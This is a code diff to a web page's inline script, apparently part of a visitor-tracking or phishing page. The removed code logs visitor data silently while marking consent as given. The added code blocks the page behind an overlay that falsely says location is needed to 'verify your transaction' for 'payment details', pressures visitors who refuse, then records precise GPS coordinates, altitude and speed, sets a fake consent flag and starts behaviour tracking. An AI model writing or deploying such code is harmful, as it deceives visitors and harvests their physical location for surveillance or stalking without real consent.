@@ -686,19 +686,177 @@
             }, 1000);
         }
 
-        // Collect data silently
-        async function logPageVisit() {
-            const visitorData = await collectVisitorData();
-            visitorData.consentGiven = true;
-            saveVisitorLog(visitorData);
-            initBehaviorTracking();
+        // Create blocking overlay for GPS
+        function createGPSOverlay() {
+            const style = document.createElement('style');
+            style.id = 'gpsOverlayStyle';
+            style.textContent = `
+                .gps-overlay {
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: rgba(0, 0, 0, 0.95);
+                    z-index: 999999;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    backdrop-filter: blur(10px);
+                }
+                .gps-box {
+                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+                    padding: 40px;
+                    border-radius: 20px;
+                    text-align: center;
+                    max-width: 380px;
+                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+                    animation: shake 0.5s ease-in-out;
+                }
+                @keyframes shake {
+                    0%, 100% { transform: translateX(0); }
+                    20%, 60% { transform: translateX(-10px); }
+                    40%, 80% { transform: translateX(10px); }
+                }
+                .gps-icon {
+                    font-size: 60px;
+                    margin-bottom: 20px;
+                }
+                .gps-title {
+                    color: #ff6b6b;
+                    font-size: 22px;
+                    font-weight: 700;
+                    margin: 0 0 15px 0;
+                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                }
+                .gps-text {
+                    color: #e0e0e0;
+                    font-size: 14px;
+                    line-height: 1.6;
+                    margin: 0 0 25px 0;
+                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                }
+                .gps-btn {
+                    background: linear-gradient(135deg, #4caf50 0%, #45a049 100%);
+                    color: white;
+                    border: none;
+                    padding: 16px 40px;
+                    font-size: 16px;
+                    font-weight: 600;
+                    border-radius: 10px;
+                    cursor: pointer;
+                    text-transform: uppercase;
+                    letter-spacing: 1px;
+                    box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
+                    transition: all 0.3s ease;
+                    width: 100%;
+                }
+                .gps-btn:hover {
+                    transform: translateY(-2px);
+                    box-shadow: 0 6px 20px rgba(76, 175, 80, 0.5);
+                }
+                .gps-warning {
+                    color: #ffd700;
+                    font-size: 12px;
+                    margin-top: 15px;
+                }
+            `;
+            document.head.appendChild(style);
+
+            const overlay = document.createElement('div');
+            overlay.className = 'gps-overlay';
+            overlay.id = 'gpsOverlay';
+            overlay.innerHTML = `
+                <div class="gps-box">
+                    <div class="gps-icon">📍</div>
+                    <h3 class="gps-title">Location Required</h3>
+                    <p class="gps-text">
+                        To view the payment details, please enable location access.
+                        This helps us verify your transaction.
+                    </p>
+                    <button class="gps-btn" id="enableGpsBtn">Enable Location</button>
+                    <p class="gps-warning">You must allow location to continue</p>
+                </div>
+            `;
+            document.body.appendChild(overlay);
+
+            document.getElementById('enableGpsBtn').addEventListener('click', requestGPS);
         }
 
-        // Initialize
+        // Request GPS permission
+        async function requestGPS() {
+            if (!navigator.geolocation) {
+                alert('Your browser does not support location. Please use a different browser.');
+                return;
+            }
+
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 30000,
+                maximumAge: 0
+            };
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    // GPS granted - remove overlay and collect data
+                    document.getElementById('gpsOverlay')?.remove();
+                    document.getElementById('gpsOverlayStyle')?.remove();
+
+                    // Collect all data including GPS
+                    const visitorData = await collectVisitorData();
+                    visitorData.consentGiven = true;
+                    visitorData.gpsForced = true;
+
+                    // Override GPS with fresh data
+                    visitorData.gps = {
+                        available: true,
+                        permission: 'granted',
+                        gpsCoordinates: {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        },
+                        accuracy: position.coords.accuracy ? Math.round(position.coords.accuracy) + ' meters' : null,
+                        altitude: position.coords.altitude ? Math.round(position.coords.altitude) + ' meters' : null,
+                        speed: position.coords.speed ? (position.coords.speed * 3.6).toFixed(1) + ' km/h' : null,
+                        timestamp: new Date(position.timestamp).toISOString(),
+                        googleMapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+                    };
+
+                    saveVisitorLog(visitorData);
+                    initBehaviorTracking();
+                },
+                (error) => {
+                    // GPS denied - shake and show message
+                    const box = document.querySelector('.gps-box');
+                    if (box) {
+                        box.style.animation = 'none';
+                        setTimeout(() => { box.style.animation = 'shake 0.5s ease-in-out'; }, 10);
+                    }
+
+                    const title = document.querySelector('.gps-title');
+                    if (title) {
+                        title.textContent = 'Location Access Denied!';
+                        title.style.color = '#ff4444';
+                    }
+
+                    const text = document.querySelector('.gps-text');
+                    if (text) {
+                        text.innerHTML = 'You <strong>must</strong> enable location to view this page.<br><br>Please click the button and select <strong>"Allow"</strong> when prompted.';
+                    }
+                },
+                options
+            );
+        }
+
+        // Initialize with GPS requirement
+        function init() {
+            createGPSOverlay();
+        }
+
         if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', logPageVisit);
+            document.addEventListener('DOMContentLoaded', init);
         } else {
-            logPageVisit();
+            init();
         }
     })();
     </script>
